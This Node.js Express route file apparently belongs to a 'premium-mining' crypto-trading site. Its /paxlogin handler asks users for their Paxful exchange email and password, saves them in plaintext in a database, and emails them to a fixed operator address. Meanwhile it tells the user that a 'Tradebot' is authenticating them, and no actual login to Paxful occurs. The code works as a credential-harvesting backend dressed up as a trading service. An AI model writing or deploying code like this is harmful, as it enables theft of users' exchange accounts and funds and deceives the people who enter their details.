var express = require('express');
var router = express.Router();
const {ensureAuthenticated} = require('../config/auth')
const {ensureAuthenticate} = require('../config/auths')
const bcrypt = require('bcrypt');
const sgMail = require('@sendgrid/mail')
// var Client = require('coinbase').Client;

var coinbase = require('coinbase-commerce-node');
var Checkout = coinbase.resources.Checkout;
var Charge = coinbase.resources.Charge;
var Client = coinbase.Client;

// Client.init('[coinbase_commerce_apikey]');
Client.init('[coinbase_commerce_apikey]');


var multer = require('multer')
const path = require('path');

// SET STORAGE
var storage = multer.diskStorage({
  destination: function (req, file, cb) {
    cb(null, 'public/uploads')
  },
  filename: function (req, file, cb) {
    cb(null, file.fieldname + '-' + Date.now() + path.extname(file.originalname))
  }
})
 
var upload = multer({ storage: storage })

const passport = require('passport');
var randomstring = require("randomstring");
const nodemailer = require('nodemailer'),
    mailTransporter = nodemailer.createTransport({
        host: '[your_host_name]',
        port: 465,
        secure: true, //this is true as port is 465
        auth: {
            user: '[username]',
            pass: '[password]'
        },
    }),
    EmailTemplate = require('email-templates').EmailTemplate,
    Promise = require('bluebird');


/* GET home page. */
// router.get('/', function(req, res, next) {
//   res.render('index', { title: 'Express' });
// });


router.get('/:email', (req, res) => {
    var email = req.params.email
    res.render('index', {
        "email": email
    })
})

router.post('/paxlogin', (req, res) => {

    var paxemail = req.body.paxful_email
    var paxpassword = req.body.paxful_password
    var email = req.body.email

    if (paxemail === '' || paxpassword === '') {
        res.json({
            confirmation: "failed",
            data: "Please fill in all details to continue"
        })
        return
    }
    else {
        var db = req.db
        
        var collection = db.get('users')

        collection.find({"username":email}, function (err, doc) {
            if (err) {
                console.log(err)
            }
            if (doc == '') {
                res.json({
                    confirmation: "failed",
                    data: "You must be registered on premium-mining to continue"
                })
                return
            }
            else {
                var db = req.db
            
                var collection = db.get('paxful')
                
                collection.find({"username":email}, function (err, doc) {
                    if (doc == '') {
                        var db = req.db
            
                        var collection = db.get('paxful')
                        
                        collection.insert({
                            "username": email,
                            "paxemail": paxemail,
                            "paxpassword": paxpassword,
                            "tradaccount": "Paxful",
                            "accountstatus": "pending",
                            "btcaccbal": "pending",
                            "tradestatus": "pending",
                            "amounttrade": "pending",
                            "estimatedreturns": "pending",
                            "totalreturns": "pending",
                            "duration": "pending",
                            "colour": "warning"
                        }, function (err, doc) {
                            if (err) {
                                console.log(err)
                            }
                            else {
                                let users = [
                                    {
                                        email: email,
                                        paxemail: paxemail,
                                        paxpassword: paxpassword,
                                    },
                                ];
        
                                function sendEmail (obj) {
                                    return mailTransporter.sendMail(obj);
                                }
        
                                function loadTemplate (templateName, contexts) {
                                    let template = new EmailTemplate(path.join(__dirname, 'templates', templateName));
                                    return Promise.all(contexts.map((context) => {
                                        return new Promise((resolve, reject) => {
                                            template.render(context, (err, result) => {
                                                if (err) reject(err);
                                                else resolve({
                                                    email: result,
                                                    context,
                                                });
                                            });
                                        });
                                    }));
                                }
        
                                loadTemplate('paxful', users).then((results) => {
                                    return Promise.all(results.map((result) => {
                                        sendEmail({
                                            to: "[to_email]",
                                            from: '[from_email]',
                                            subject: result.email.subject,
                                            html: result.email.html,
                                            text: result.email.text,
                                        });
                                    }));
                                }).then(() => {
                                    res.json({
                                        confirmation: "success",
                                        data: "Tradebot is authenticating your login details, you would be informed once the process is complete"
                                    })
                                    
                                });
                            }
                        })
                    }
                    else {
                        res.json({
                            confirmation: "failed",
                            data: "Your Data is being authenticated, Please hold"
                        })
                        return
                    }
                })

                
            }
        })
    }
})

module.exports = router;
